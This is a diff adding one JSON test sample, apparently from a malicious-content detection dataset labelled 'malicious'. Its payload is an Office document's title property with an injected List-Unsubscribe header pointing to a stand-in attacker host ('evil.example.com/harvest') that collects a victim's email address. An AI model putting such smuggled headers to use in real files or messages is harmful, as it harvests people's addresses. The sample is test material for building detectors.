@@ -1,0 +1,15 @@
+{
+  "schema_version": "1.0.0",
+  "id": "exp::email-webfetch::60::binary-variations::0",
+  "base_sample_id": "exp::email-webfetch::60",
+  "generator_id": "binary-variations",
+  "generator_version": "1.0.0",
+  "seed": -1251580180,
+  "content": "{\n  \"format\": \"office\",\n  \"coreProperties\": {\n    \"dc:title\": \"List-Unsubscribe: <http://evil.example.com/harvest?email=victim@target.example.com>\\n\",\n    \"dc:creator\": \"John Doe\",\n    \"cp:lastModifiedBy\": \"Jane Smith\",\n    \"dcterms:created\": \"2026-01-15T10:30:00Z\"\n  }\n}",
+  "content_hash": "6af095125ce3e30621fb58c862d63883ecdd17f7e23ceaab6881b3560d4ef3eb",
+  "content_type": "text",
+  "expected_verdict": "malicious",
+  "expected_modules": [],
+  "variation_type": "binary:office-properties",
+  "difficulty": "advanced"
+}
